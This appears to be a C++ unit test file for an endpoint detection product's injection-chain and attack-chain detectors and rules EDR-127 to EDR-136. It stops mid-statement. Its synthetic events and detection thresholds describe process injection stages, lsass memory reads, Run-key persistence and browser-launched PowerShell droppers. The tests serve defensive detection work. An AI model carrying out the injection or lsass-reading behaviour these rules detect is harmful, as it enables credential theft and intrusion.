/*
 * detector_tests.cpp - Unit tests for InjectionChainDetector,
 * AttackChainDetector, their config blocks, and the production rules they
 * feed (EDR-127 through EDR-136).
 */
#include "detector_tests.h"

#include <windows.h>

#include <algorithm>
#include <array>
#include <fstream>
#include <stdexcept>
#include <string>
#include <vector>

#include "attack_chain_detector.h"
#include "behavior_enricher.h"
#include "config.h"
#include "edr_event.h"
#include "event_bus.h"
#include "injection_chain_detector.h"
#include "rule_engine.h"

namespace {

#define DT_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "detector test failed at line " + std::to_string(line) +
            ": " + expression);
}

const char* ProductionRulesPath() {
    return GetFileAttributesA("..\\rules\\rules.json") !=
                   INVALID_FILE_ATTRIBUTES
        ? "..\\rules\\rules.json"
        : "rules\\rules.json";
}

bool Has(const std::vector<std::string>& hits, const char* id) {
    return std::find(hits.begin(), hits.end(), id) != hits.end();
}

edr::Event CrossProcess(uint16_t type, const std::string& typeName,
                        uint32_t source, uint32_t target,
                        uint64_t ts100ns) {
    edr::Event event;
    event.type = type;
    event.ts100ns = ts100ns;
    event.pid = source;
    event.fields[edr::field::kType] = typeName;
    event.fields[edr::field::kSourcePid] = std::to_string(source);
    event.fields[edr::field::kTargetPid] = std::to_string(target);
    event.fields[edr::field::kCrossProcess] = "true";
    return event;
}

void TestInjectionChainNoCrashAndSkip() {
    edr::InjectionChainDetector detector(4096, 60);

    edr::Event other;
    other.type = EDR_EVT_DNS_QUERY;
    other.pid = 300;
    other.fields[edr::field::kType] = "DNS_QUERY";
    detector.Enrich(other);
    DT_CHECK(other.fields.find(edr::field::kInjectChainScore) ==
             other.fields.end());
    DT_CHECK(detector.StateCount() == 0);

    edr::Event access = CrossProcess(EDR_EVT_PROCESS_ACCESS, "PROCESS_ACCESS",
                                     1001, 2001, 1000);
    detector.Enrich(access);
    DT_CHECK(access.fields.find(edr::field::kInjectChainScore) ==
             access.fields.end());
    DT_CHECK(detector.StateCount() == 0);

    edr::Event noTarget = access;
    noTarget.fields.erase(edr::field::kSourcePid);
    detector.Enrich(noTarget);
    DT_CHECK(noTarget.fields.find(edr::field::kInjectChainScore) ==
             noTarget.fields.end());

    edr::Event samePid = access;
    samePid.fields[edr::field::kTargetPid] =
        samePid.fields[edr::field::kSourcePid];
    detector.Enrich(samePid);
    DT_CHECK(samePid.fields.find(edr::field::kInjectChainScore) ==
             samePid.fields.end());

    edr::Event notCross = access;
    notCross.fields[edr::field::kCrossProcess] = "false";
    detector.Enrich(notCross);
    DT_CHECK(notCross.fields.find(edr::field::kInjectChainScore) ==
             notCross.fields.end());
    DT_CHECK(detector.StateCount() == 0);
}

void TestInjectionChainProgression() {
    edr::InjectionChainDetector detector(4096, 60);
    const uint64_t base = 100000000000ULL;

    edr::Event access = CrossProcess(EDR_EVT_PROCESS_ACCESS, "PROCESS_ACCESS",
                                     1001, 2001, base);
    access.fields[edr::field::kAccessVmOperation] = "true";
    detector.Enrich(access);
    DT_CHECK(access.fields.at(edr::field::kInjectChainScore) == "20");
    DT_CHECK(access.fields.at(edr::field::kInjectChainStage) == "ACCESS");
    DT_CHECK(access.fields.at(edr::field::kInjectChainReasons) == "access");

    edr::Event write = CrossProcess(EDR_EVT_MEMORY_WRITE, "MEMORY_WRITE",
                                    1001, 2001, base + 10000000);
    write.fields[edr::field::kTargetImage] =
        "C:\\Windows\\System32\\explorer.exe";
    detector.Enrich(write);
    DT_CHECK(write.fields.at(edr::field::kInjectChainScore) == "40");
    DT_CHECK(write.fields.at(edr::field::kInjectChainStage) == "WRITE");
    DT_CHECK(write.fields.at(edr::field::kInjectTargetImage) ==
             "C:\\Windows\\System32\\explorer.exe");

    edr::Event execute = CrossProcess(EDR_EVT_THREAD_CREATE, "THREAD_CREATE",
                                      1001, 2001, base + 20000000);
    execute.fields[edr::field::kRemoteThread] = "true";
    detector.Enrich(execute);
    DT_CHECK(execute.fields.at(edr::field::kInjectChainScore) == "75");
    DT_CHECK(execute.fields.at(edr::field::kInjectChainStage) == "EXECUTE");
    DT_CHECK(execute.fields.at(edr::field::kInjectChainReasons) ==
             "access,write,execute");

    edr::Event read = CrossProcess(EDR_EVT_PROCESS_READ, "PROCESS_READ",
                                   1001, 2001, base + 30000000);
    read.fields[edr::field::kTargetImage] =
        "C:\\Windows\\System32\\lsass.exe";
    detector.Enrich(read);
    DT_CHECK(read.fields.at(edr::field::kInjectChainScore) == "95");
    DT_CHECK(read.fields.at(edr::field::kInjectChainStage) == "READ");
    DT_CHECK(read.fields.at(edr::field::kInjectChainReasons) ==
             "access,write,execute,lsass_read");

    edr::Event localThread = CrossProcess(EDR_EVT_THREAD_CREATE,
                                          "THREAD_CREATE", 1001, 2001,
                                          base + 40000000);
    localThread.fields[edr::field::kRemoteThread] = "false";
    detector.Enrich(localThread);
    DT_CHECK(localThread.fields.at(edr::field::kInjectChainScore) == "95");
    DT_CHECK(localThread.fields.at(edr::field::kInjectChainStage) == "READ");

    edr::Event dup = CrossProcess(EDR_EVT_HANDLE_DUPLICATE,
                                  "HANDLE_DUPLICATE", 1001, 2001,
                                  base + 50000000);
    dup.fields[edr::field::kTargetImage] =
        "C:\\Windows\\System32\\ntdll.dll";
    detector.Enrich(dup);
    DT_CHECK(dup.fields.at(edr::field::kInjectChainScore) == "95");
    DT_CHECK(dup.fields.at(edr::field::kInjectChainStage) == "READ");
}

void TestInjectionChainMinTransitionScore() {
    edr::InjectionChainDetector detector(4096, 60, 70);
    const uint64_t base = 100000000000ULL;

    edr::Event access = CrossProcess(EDR_EVT_PROCESS_ACCESS, "PROCESS_ACCESS",
                                     1001, 2001, base);
    access.fields[edr::field::kAccessVmOperation] = "true";
    detector.Enrich(access);
    DT_CHECK(detector.StateCount() == 1);
    DT_CHECK(access.fields.find(edr::field::kInjectChainScore) ==
             access.fields.end());
    DT_CHECK(access.fields.find(edr::field::kInjectChainStage) ==
             access.fields.end());
    DT_CHECK(access.fields.find(edr::field::kInjectChainReasons) ==
             access.fields.end());

    edr::Event write = CrossProcess(EDR_EVT_MEMORY_WRITE, "MEMORY_WRITE",
                                    1001, 2001, base + 10000000);
    detector.Enrich(write);
    DT_CHECK(detector.StateCount() == 1);
    DT_CHECK(write.fields.find(edr::field::kInjectChainScore) ==
             write.fields.end());
    DT_CHECK(write.fields.find(edr::field::kInjectChainStage) ==
             write.fields.end());
    DT_CHECK(write.fields.find(edr::field::kInjectChainReasons) ==
             write.fields.end());

    edr::Event execute = CrossProcess(EDR_EVT_THREAD_CREATE, "THREAD_CREATE",
                                      1001, 2001, base + 20000000);
    execute.fields[edr::field::kRemoteThread] = "true";
    detector.Enrich(execute);
    DT_CHECK(execute.fields.at(edr::field::kInjectChainScore) == "75");
    DT_CHECK(execute.fields.at(edr::field::kInjectChainStage) == "EXECUTE");
    DT_CHECK(execute.fields.at(edr::field::kInjectChainReasons) ==
             "access,write,execute");
}

void TestInjectionChainCapacityEviction() {
    edr::InjectionChainDetector detector(2, 60);
    const uint64_t base = 200000000000ULL;

    for (uint32_t target = 1; target <= 3; ++target) {
        edr::Event access = CrossProcess(EDR_EVT_PROCESS_ACCESS,
                                         "PROCESS_ACCESS", 1001, target,
                                         base + target * 1000000);
        access.fields[edr::field::kAccessVmWrite] = "true";
        detector.Enrich(access);
        DT_CHECK(access.fields.at(edr::field::kInjectChainScore) == "20");
    }
    DT_CHECK(detector.StateCount() == 2);

    edr::Event reFirst = CrossProcess(EDR_EVT_PROCESS_ACCESS,
                                      "PROCESS_ACCESS", 1000, 1,
                                      base + 4 * 1000000);
    reFirst.fields[edr::field::kAccessVmWrite] = "true";
    detector.Enrich(reFirst);
    DT_CHECK(reFirst.fields.at(edr::field::kInjectChainScore) == "20");
    DT_CHECK(reFirst.fields.at(edr::field::kInjectChainStage) == "ACCESS");
}

void DispatchAttack(edr::AttackChainDetector& detector, edr::Event& event) {
    if (detector.Inspects(event.type)) detector.Enrich(event);
}

void TestAttackChainBasic() {
    edr::AttackChainDetector detector(4096, 600);
    const uint64_t base = 300000000000ULL;

    edr::Event persistence;
    persistence.type = EDR_EVT_REG_WRITE;
    persistence.ts100ns = base;
    persistence.pid = 5000;
    persistence.processStartTime100ns = 123456;
    persistence.fields[edr::field::kType] = "REG_WRITE";
    persistence.fields[edr::field::kRegKey] =
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Evil";
    DispatchAttack(detector, persistence);
    /* One tactic = 15, below the 55 SUSPICIOUS bar: no fields published. */
    DT_CHECK(persistence.fields.find(edr::field::kAttackChainScore) ==
             persistence.fields.end());
    DT_CHECK(persistence.fields.find(edr::field::kAttackChainStages) ==
             persistence.fields.end());

    edr::Event network;
    network.type = EDR_EVT_NET_CONNECT;
    network.ts100ns = base + 10000000;
    network.pid = 5000;
    network.processStartTime100ns = 123456;
    network.fields[edr::field::kType] = "NET_CONNECT";
    network.fields[edr::field::kDstIp] = "8.8.8.8";
    DispatchAttack(detector, network);
    /* Two tactics = 30: still withheld. */
    DT_CHECK(network.fields.find(edr::field::kAttackChainScore) ==
             network.fields.end());

    edr::Event privilege;
    privilege.type = EDR_EVT_PRIVILEGE;
    privilege.ts100ns = base + 20000000;
    privilege.pid = 5000;
    privilege.processStartTime100ns = 123456;
    privilege.fields[edr::field::kType] = "PRIVILEGE";
    privilege.fields[edr::field::kPrivilegeOperation] = "SENSITIVE_USED";
    DispatchAttack(detector, privilege);
    /* Three tactics = 45: still withheld. */
    DT_CHECK(privilege.fields.find(edr::field::kAttackChainScore) ==
             privilege.fields.end());

    edr::Event start;
    start.type = EDR_EVT_PROCESS_START;
    start.ts100ns = base + 30000000;
    start.pid = 5000;
    start.processStartTime100ns = 123456;
    start.fields[edr::field::kType] = "PROCESS_START";
    start.fields[edr::field::kImage] =
        "C:\\Users\\alice\\AppData\\Local\\Temp\\stage.exe";
    DispatchAttack(detector, start);
    DT_CHECK(start.fields.at(edr::field::kAttackChainStageCount) == "4");
    DT_CHECK(start.fields.at(edr::field::kAttackChainScore) == "70");
}

void TestAttackChainPerPidIsolation() {
    edr::AttackChainDetector detector(4096, 600);
    const uint64_t base = 400000000000ULL;

    edr::Event regA;
    regA.type = EDR_EVT_REG_WRITE;
    regA.ts100ns = base;
    regA.pid = 6001;
    regA.processStartTime100ns = 123456;
    regA.fields[edr::field::kType] = "REG_WRITE";
    regA.fields[edr::field::kRegKey] = "HKLM\\Software\\CurrentVersion\\Run\\X";
    DispatchAttack(detector, regA);
    /* One tactic = 15: withheld. */
    DT_CHECK(regA.fields.find(edr::field::kAttackChainScore) ==
             regA.fields.end());

    edr::Event netA;
    netA.type = EDR_EVT_NET_CONNECT;
    netA.ts100ns = base + 10000000;
    netA.pid = 6001;
    netA.processStartTime100ns = 123456;
    netA.fields[edr::field::kType] = "NET_CONNECT";
    netA.fields[edr::field::kDstIp] = "1.1.1.1";
    DispatchAttack(detector, netA);
    DT_CHECK(netA.fields.find(edr::field::kAttackChainScore) ==
             netA.fields.end());

    edr::Event regB;
    regB.type = EDR_EVT_REG_WRITE;
    regB.ts100ns = base + 20000000;
    regB.pid = 6002;
    regB.processStartTime100ns = 123456;
    regB.fields[edr::field::kType] = "REG_WRITE";
    regB.fields[edr::field::kRegKey] = "HKLM\\Software\\CurrentVersion\\Run\\Y";
    DispatchAttack(detector, regB);
    /* pid 6002 is tracked independently and also sits below the bar. */
    DT_CHECK(regB.fields.find(edr::field::kAttackChainScore) ==
             regB.fields.end());
    DT_CHECK(detector.StateCount() == 2);
}

void TestAttackChainWindowExpiry() {
    edr::AttackChainDetector detector(4096, 1);
    const uint64_t base = 1700000000000ULL;

    edr::Event first;
    first.type = EDR_EVT_REG_WRITE;
    first.ts100ns = base;
    first.pid = 6001;
    first.processStartTime100ns = 123456;
    first.fields[edr::field::kType] = "REG_WRITE";
    first.fields[edr::field::kRegKey] = "HKLM\\Software\\CurrentVersion\\Run\\Z";
    DispatchAttack(detector, first);
    DT_CHECK(first.fields.find(edr::field::kAttackChainScore) ==
             first.fields.end());

    edr::Event late;
    late.type = EDR_EVT_TASK_SCHEDULER;
    late.ts100ns = base + 11000000; /* > 1s window */
    late.pid = 6001;
    late.processStartTime100ns = 123456;
    late.fields[edr::field::kType] = "TASK_SCHEDULER";
    DispatchAttack(detector, late);
    /* The window expired, so the late event restarts the chain at one tactic
     * (15) - below the bar, hence nothing published. This is what proves the
     * expiry ran: without it the score would have been 30. */
    DT_CHECK(late.fields.find(edr::field::kAttackChainScore) ==
             late.fields.end());
}

edr::Event AttackEvent(uint16_t type, uint64_t creation, uint64_t time) {
    edr::Event event;
    event.type = type;
    event.pid = 5000;
    event.processStartTime100ns = creation;
    event.ts100ns = time;
    event.source = "sysmon";
    event.fields[edr::field::kType] = type == EDR_EVT_PROCESS_START ? "PROCESS_START" : "OTHER";
    event.fields[edr::field::kImage] = "C:\\Temp\\stage.exe";
    event.fields[edr::field::kRegKey] = "HKLM\\Software\\CurrentVersion\\Run\\X";
    event.fields[edr::field::kDstIp] = "8.8.8.8";
    event.fields[edr::field::kPrivilegeOperation] = "SENSITIVE_USED";
    return event;
}

void TestAttackChainIdentityAndRulePipeline() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });
    for (int scenario = 0; scenario < 9; ++scenario) {
        edr::AttackChainDetector detector(8, 600);
        const bool opaque = scenario >= 2;
        const uint64_t creation = opaque ? 0 : 100;
        for (uint16_t type : std::array<uint16_t, 3>{EDR_EVT_REG_WRITE, EDR_EVT_NET_CONNECT, EDR_EVT_PRIVILEGE}) {
            auto event = AttackEvent(type, creation, 1000000000 + type);
            if (opaque) event.processIdentity = "{instance-a}";
            if (scenario == 3) event.processIdentity.clear();
            if (scenario == 4) event.processIdentity = "pid:5000";
            if (scenario == 5) event.processIdentity = "wmi/5000";
            if (scenario == 8) event.source = "untrusted-source";
            DispatchAttack(detector, event);
        }
        auto start = AttackEvent(EDR_EVT_PROCESS_START, creation, 1010000000);
        if (opaque) start.processIdentity = "{instance-a}";
        if (scenario == 1) start.processStartTime100ns = 200;
        if (scenario == 2) start.processIdentity = "{instance-b}";
        if (scenario == 3) start.processIdentity.clear();
        if (scenario == 4) start.processIdentity = "pid:5000";
        if (scenario == 5) start.processIdentity = "wmi/5000";
        if (scenario == 6) start.source = "etw";
        if (scenario == 7) start.fields[edr::field::kEndpointId] = "other-endpoint";
        if (scenario == 8) start.source = "untrusted-source";
        DispatchAttack(detector, start);
        hits.clear();
        engine.OnEvent(start);
        DT_CHECK(Has(hits, "EDR-134") == (scenario == 0));
        DT_CHECK((start.fields.count(edr::field::kAttackChainScore) != 0) == (scenario == 0));
    }
}

void TestAttackChainLifecycleDispatch() {
    edr::AttackChainDetector detector(8, 600);
    DT_CHECK(detector.Inspects(EDR_EVT_PROCESS_STOP));
    auto oldStart = AttackEvent(EDR_EVT_PROCESS_START, 100, 1000000000);
    auto newStart = AttackEvent(EDR_EVT_PROCESS_START, 200, 1010000000);
    DispatchAttack(detector, oldStart);
    DispatchAttack(detector, newStart);
    auto stopOld = AttackEvent(EDR_EVT_PROCESS_STOP, 100, 1020000000);
    DispatchAttack(detector, stopOld);
    DT_CHECK(detector.StateCount() == 1);
    auto weakStop = AttackEvent(EDR_EVT_PROCESS_STOP, 0, 1030000000);
    DispatchAttack(detector, weakStop);
    DT_CHECK(detector.StateCount() == 1);
    auto reg = AttackEvent(EDR_EVT_REG_WRITE, 200, 1040000000);
    auto net = AttackEvent(EDR_EVT_NET_CONNECT, 200, 1050000000);
    DispatchAttack(detector, reg);
    DispatchAttack(detector, net);
    DT_CHECK(net.fields.at(edr::field::kAttackChainScore) == "55");
    auto duplicate = AttackEvent(EDR_EVT_PROCESS_START, 200, 1060000000);
    DispatchAttack(detector, duplicate);
    DT_CHECK(duplicate.fields.at(edr::field::kAttackChainScore) == "55");
    auto weakStart = AttackEvent(EDR_EVT_PROCESS_START, 0, 1070000000);
    DispatchAttack(detector, weakStart);
    DT_CHECK(detector.StateCount() == 0);
    auto later = AttackEvent(EDR_EVT_PRIVILEGE, 200, 1080000000);
    DispatchAttack(detector, later);
    DT_CHECK(later.fields.count(edr::field::kAttackChainScore) == 0);
    auto stopNew = AttackEvent(EDR_EVT_PROCESS_STOP, 200, 1090000000);
    DispatchAttack(detector, stopNew);
    DT_CHECK(detector.StateCount() == 0);
}

void TestAttackChainOpaqueAndExactIdentity() {
    for (int mode = 0; mode < 3; ++mode) {
        edr::AttackChainDetector detector(1, 600);
        edr::Event last;
        for (uint16_t type : std::array<uint16_t, 3>{EDR_EVT_PROCESS_START, EDR_EVT_REG_WRITE, EDR_EVT_NET_CONNECT}) {
            last = AttackEvent(type, 0, 1000000000 + type);
            last.processIdentity = mode == 0 ? "{instance}" : "5000@100";
            if (mode == 2 && type != EDR_EVT_PROCESS_START) {
                last.processStartTime100ns = 100;
                last.processIdentity = "sequence@77";
                last.source = "etw";
            }
            DispatchAttack(detector, last);
        }
        DT_CHECK(last.fields.at(edr::field::kAttackChainScore) == "55");
        auto different = AttackEvent(EDR_EVT_PROCESS_START, 200, 1020000000);
        DispatchAttack(detector, different);
        DT_CHECK(detector.StateCount() == 1);
        auto old = AttackEvent(EDR_EVT_REG_WRITE, 0, 1030000000);
        old.processIdentity = mode == 0 ? "{instance}" : "5000@100";
        DispatchAttack(detector, old);
        DT_CHECK(old.fields.count(edr::field::kAttackChainScore) == 0);
    }
}

void TestAttackChainExpiryBetweenSweepsAndLateEvidence() {
    edr::AttackChainDetector detector(8, 1);
    const uint64_t base = 1000000000;
    auto anchor = AttackEvent(EDR_EVT_REG_WRITE, 200, base);
    DispatchAttack(detector, anchor);
    for (uint16_t type : std::array<uint16_t, 3>{EDR_EVT_PROCESS_START, EDR_EVT_REG_WRITE, EDR_EVT_NET_CONNECT}) {
        auto event = AttackEvent(type, 100, base + 5000000);
        DispatchAttack(detector, event);
    }
    auto sweep = AttackEvent(EDR_EVT_REG_WRITE, 200, base + 11000000);
    DispatchAttack(detector, sweep);
    // This instance expires between lazy global sweeps; its tactics cannot survive.
    auto expired = AttackEvent(EDR_EVT_PRIVILEGE, 100, base + 16000000);
    DispatchAttack(detector, expired);
    DT_CHECK(expired.fields.count(edr::field::kAttackChainScore) == 0);

    edr::AttackChainDetector lateDetector(8, 1);
    for (uint16_t type : std::array<uint16_t, 3>{EDR_EVT_PROCESS_START, EDR_EVT_REG_WRITE, EDR_EVT_NET_CONNECT}) {
        auto event = AttackEvent(type, 100, base);
        DispatchAttack(lateDetector, event);
    }
    auto late = AttackEvent(EDR_EVT_PRIVILEGE, 100, base - 20000000);
    DispatchAttack(lateDetector, late);
    DT_CHECK(late.fields.count(edr::field::kAttackChainScore) == 0);
    auto recent = AttackEvent(EDR_EVT_REG_WRITE, 100, base + 9000000);
    DispatchAttack(lateDetector, recent);
    DT_CHECK(recent.fields.at(edr::field::kAttackChainScore) == "55");
}

void TestDetectorConfigStrictAtomic() {
    edr::Config defaults;
    DT_CHECK(!defaults.injectChainEnable);
    DT_CHECK(defaults.injectChainStateCapacity == 4096);
    DT_CHECK(defaults.injectChainWindowSeconds == 60);
    DT_CHECK(defaults.injectChainMinTransitionScore == 0);
    DT_CHECK(!defaults.attackChainEnable);
    DT_CHECK(defaults.attackChainStateCapacity == 4096);
    DT_CHECK(defaults.attackChainWindowSeconds == 600);

    const char* path = "edr-native-detector-config.json";
    {
        std::ofstream out(path, std::ios::binary);
        out << R"({"inject_chain":{"enable":true,"state_capacity":1024,"window_seconds":120,"min_transition_score":50},"attack_chain":{"enable":true,"state_capacity":2048,"window_seconds":300}})";
    }
    edr::Config config;
    std::string error;
    DT_CHECK(edr::LoadConfigFile(path, config, error));
    DT_CHECK(config.injectChainEnable);
    DT_CHECK(config.injectChainStateCapacity == 1024);
    DT_CHECK(config.injectChainWindowSeconds == 120);
    DT_CHECK(config.injectChainMinTransitionScore == 50);
    DT_CHECK(config.attackChainEnable);
    DT_CHECK(config.attackChainStateCapacity == 2048);
    DT_CHECK(config.attackChainWindowSeconds == 300);

    for (const char* invalid : {
        R"({"inject_chain":true})",
        R"({"inject_chain":{"unknown":1}})",
        R"({"inject_chain":{"enable":"true"}})",
        R"({"inject_chain":{"state_capacity":63}})",
        R"({"inject_chain":{"state_capacity":65537}})",
        R"({"inject_chain":{"window_seconds":9}})",
        R"({"inject_chain":{"window_seconds":3601}})",
        R"({"inject_chain":{"window_seconds":10.5}})",
        R"({"inject_chain":{"min_transition_score":19}})",
        R"({"inject_chain":{"min_transition_score":101}})",
        R"({"attack_chain":true})",
        R"({"attack_chain":{"unknown":1}})",
        R"({"attack_chain":{"enable":"true"}})",
        R"({"attack_chain":{"state_capacity":127}})",
        R"({"attack_chain":{"state_capacity":65537}})",
        R"({"attack_chain":{"window_seconds":29}})",
        R"({"attack_chain":{"window_seconds":3601}})" }) {
        std::ofstream out(path, std::ios::binary);
        out << invalid;
        out.close();
        edr::Config unchanged;
        unchanged.injectChainStateCapacity = 777;
        unchanged.injectChainWindowSeconds = 222;
        unchanged.attackChainStateCapacity = 333;
        unchanged.attackChainWindowSeconds = 444;
        DT_CHECK(!edr::LoadConfigFile(path, unchanged, error));
        DT_CHECK(unchanged.injectChainStateCapacity == 777);
        DT_CHECK(unchanged.injectChainWindowSeconds == 222);
        DT_CHECK(unchanged.attackChainStateCapacity == 333);
        DT_CHECK(unchanged.attackChainWindowSeconds == 444);
    }
    DeleteFileA(path);
}

void TestHooksConfigKeys() {
    const char* path = "edr-native-hooks-config.json";
    {
        std::ofstream out(path, std::ios::binary);
        out << R"({"enable_hooks_injection":true,"enable_hooks_rpc_create_process":true,"enable_hooks_windows_hook":true})";
    }
    edr::Config config;
    std::string error;
    DT_CHECK(edr::LoadConfigFile(path, config, error));
    DT_CHECK(config.enableHooksInjection);
    DT_CHECK(config.enableHooksRpcCreateProcess);
    DT_CHECK(config.enableHooksWindowsHook);
    DeleteFileA(path);
}

void TestRuleEdr127And128() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });

    edr::Event apc;
    apc.type = EDR_EVT_APC_INJECT;
    apc.fields[edr::field::kType] = "APC_INJECT";
    apc.fields[edr::field::kCrossProcess] = "true";
    apc.fields[edr::field::kInjectChainScore] = "70";
    engine.OnEvent(apc);
    DT_CHECK(Has(hits, "EDR-127"));
    hits.clear();
    apc.fields[edr::field::kInjectChainScore] = "55";
    engine.OnEvent(apc);
    DT_CHECK(!Has(hits, "EDR-127"));
    hits.clear();

    edr::Event thread;
    thread.type = EDR_EVT_THREAD_CREATE;
    thread.fields[edr::field::kType] = "THREAD_CREATE";
    thread.fields[edr::field::kInjectChainScore] = "75";
    engine.OnEvent(thread);
    DT_CHECK(Has(hits, "EDR-128"));
    hits.clear();
    thread.fields[edr::field::kInjectChainScore] = "69";
    engine.OnEvent(thread);
    DT_CHECK(!Has(hits, "EDR-128"));
}

void TestRuleEdr129To132() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });

    edr::Event section;
    section.type = EDR_EVT_SECTION_MAP;
    section.fields[edr::field::kType] = "SECTION_MAP";
    section.fields[edr::field::kCrossProcess] = "true";
    section.fields[edr::field::kSectionPath] =
        "C:\\Users\\Public\\evil32.dll";
    engine.OnEvent(section);
    DT_CHECK(Has(hits, "EDR-129"));
    hits.clear();
    section.fields[edr::field::kSectionPath] =
        "C:\\Windows\\System32\\user32.dll";
    engine.OnEvent(section);
    DT_CHECK(!Has(hits, "EDR-129"));

    edr::Event dup;
    dup.type = EDR_EVT_HANDLE_DUPLICATE;
    dup.fields[edr::field::kType] = "HANDLE_DUPLICATE";
    dup.fields[edr::field::kTargetImage] =
        "C:\\Windows\\System32\\lsass.exe";
    engine.OnEvent(dup);
    DT_CHECK(Has(hits, "EDR-130"));
    hits.clear();
    dup.fields[edr::field::kTargetImage] =
        "C:\\Windows\\System32\\notepad.exe";
    engine.OnEvent(dup);
    DT_CHECK(!Has(hits, "EDR-130"));

    edr::Event rpc;
    rpc.type = EDR_EVT_RPC_CREATE_PROCESS;
    rpc.fields[edr::field::kType] = "RPC_CREATE_PROCESS";
    rpc.fields[edr::field::kFilePath] =
        "C:\\Users\\joe\\AppData\\Roaming\\setup.exe";
    engine.OnEvent(rpc);
    DT_CHECK(Has(hits, "EDR-131"));
    hits.clear();
    rpc.fields[edr::field::kFilePath] =
        "C:\\Windows\\System32\\notepad.exe";
    engine.OnEvent(rpc);
    DT_CHECK(!Has(hits, "EDR-131"));

    edr::Event hook;
    hook.type = EDR_EVT_WINDOWS_HOOK;
    hook.fields[edr::field::kType] = "WINDOWS_HOOK";
    hook.fields[edr::field::kHookThreadId] = "0";
    engine.OnEvent(hook);
    DT_CHECK(Has(hits, "EDR-132"));
    hits.clear();
    hook.fields[edr::field::kHookThreadId] = "5";
    engine.OnEvent(hook);
    DT_CHECK(!Has(hits, "EDR-132"));
}

void TestRuleEdr133To136() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });

    edr::Event read;
    read.type = EDR_EVT_PROCESS_READ;
    read.fields[edr::field::kType] = "PROCESS_READ";
    read.fields[edr::field::kInjectChainStage] = "READ";
    read.fields[edr::field::kInjectChainScore] = "60";
    engine.OnEvent(read);
    DT_CHECK(Has(hits, "EDR-133"));
    hits.clear();
    read.fields[edr::field::kInjectChainScore] = "40";
    engine.OnEvent(read);
    DT_CHECK(!Has(hits, "EDR-133"));

    edr::Event start;
    start.type = EDR_EVT_PROCESS_START;
    start.fields[edr::field::kType] = "PROCESS_START";
    start.fields[edr::field::kAttackChainScore] = "60";
    engine.OnEvent(start);
    DT_CHECK(Has(hits, "EDR-134"));
    hits.clear();
    start.fields[edr::field::kAttackChainScore] = "59";
    engine.OnEvent(start);
    DT_CHECK(!Has(hits, "EDR-134"));

    edr::Event burst;
    burst.type = EDR_EVT_PROCESS_READ;
    burst.fields[edr::field::kType] = "PROCESS_READ";
    burst.fields[edr::field::kLsassReadBurstBytes] = "12000000";
    engine.OnEvent(burst);
    DT_CHECK(Has(hits, "EDR-136"));
    hits.clear();
    burst.fields[edr::field::kLsassReadBurstBytes] = "5000000";
    engine.OnEvent(burst);
    DT_CHECK(!Has(hits, "EDR-136"));
}

void TestRuleEdr135Pipeline() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });

    edr::BehaviorEnricher enricher(8192, 300, 60, 4194304);
    edr::Event start;
    start.type = EDR_EVT_PROCESS_START;
    start.ts100ns = 1000000;
    start.pid = 7001;
    start.ppid = 900;
    start.fields[edr::field::kType] = "PROCESS_START";
    start.fields[edr::field::kImage] =
        "C:\\Users\\alice\\AppData\\Local\\Temp\\tool.exe";
    /* A non-whitelisted parent so rare_parent_child + first_seen contribute:
     * 25 + 10 + 15 (user-writable image) = 50 - below the 55 bar, withheld. */
    start.fields[edr::field::kParentImage] =
        "C:\\Windows\\System32\\notepad.exe";
    enricher.Enrich(start);
    DT_CHECK(start.fields.find(edr::field::kChainScore) ==
             start.fields.end());
    engine.OnEvent(start);
    DT_CHECK(!Has(hits, "EDR-135"));
    DT_CHECK(!Has(hits, "EDR-081"));

    /* A browser parent launching a PowerShell child from a user-writable path
     * reaches 110 before the cap (60 browser_ps + 25 rare + 10 first_seen +
     * 15 user_writable_dir) -> capped to 100, clearing both rules: EDR-135
     * needs >=55 with user_writable_dir, EDR-081 needs >=60. This is the
     * canonical browser->PowerShell dropper shape. */
    edr::Event browser;
    browser.type = EDR_EVT_PROCESS_START;
    browser.ts100ns = 2000000;
    browser.pid = 7002;
    browser.ppid = 900;
    browser.fields[edr::field::kType] = "PROCESS_START";
    browser.fields[edr::field::kImage] =
        "C:\\Users\\alice\\AppData\\Local\\Temp\\powershell.exe";
    browser.fields[edr::field::kParentImage] =
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
    enricher.Enrich(browser);
    DT_CHECK(browser.fields.at(edr::field::kChainScore) == "100");
    DT_CHECK(browser.fields.at(edr::field::kChainReasons).find(
                 "browser_ps") != std::string::npos);
    DT_CHECK(browser.fields.at(edr::field::kChainReasons).find(
                 "user_writable_dir") != std::string::npos);
    engine.OnEvent(browser);
    DT_CHECK(Has(hits, "EDR-135"));
    DT_CHECK(Has(hits, "EDR-081"));
}

void TestInjectionChainRulesPipeline() {
    edr::RuleEngine engine;
    engine.LoadFromFile(ProductionRulesPath());
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const edr::Alert& alert) { hits.push_back(alert.ruleId); });

    edr::InjectionChainDetector detector(4096, 60);
    const uint64_t base = 500000000000ULL;

    edr::Event access = CrossProcess(EDR_EVT_PROCESS_ACCESS, "PROCESS_ACCESS",
                                     8001, 9001, base);
    access.fields[edr::field::kAccessCreateThread] = "true";
    detector.Enrich(access);
    edr::Event write = CrossProcess(EDR_EVT_SECTION_MAP, "SECTION_MAP",
                                    8001, 9001, base + 10000000);
    write.fields[edr::field::kSectionPath] = "C:\\Windows\\evil.dll";
    detector.Enrich(write);
    edr::Event execute = CrossProcess(EDR_EVT_THREAD_CREATE, "THREAD_CREATE",
